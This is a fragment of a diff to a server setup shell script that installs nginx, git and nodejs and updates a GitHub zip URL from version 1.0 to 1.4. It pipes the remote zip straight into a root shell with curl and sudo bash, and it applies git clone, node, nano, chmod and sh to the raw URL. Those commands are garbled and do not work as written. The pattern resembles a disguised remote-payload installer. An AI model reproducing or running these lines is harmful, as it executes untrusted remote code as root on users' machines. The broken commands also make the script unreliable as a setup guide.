@@ -4,17 +4,17 @@ apt-get install -y nginx
 systemctl start nginx
 systemctl enable nginx
 apt-get install -y git
-curl -SL https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip|sudo -E bash -
+curl -SL https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.4.zip|sudo -E bash -
 apt-get install -y nodejs
-git clone https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
+git clone https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.4.zip
 cd Repo1
 npm install
-node https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
+node https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.4.zip
 
 
-sudo nano https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
-sudo chmod +x https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
-sh https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
+sudo nano https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.4.zip
+sudo chmod +x https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.4.zip
+sh https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.4.zip
 #!/bin/bash
 while(true)
 do
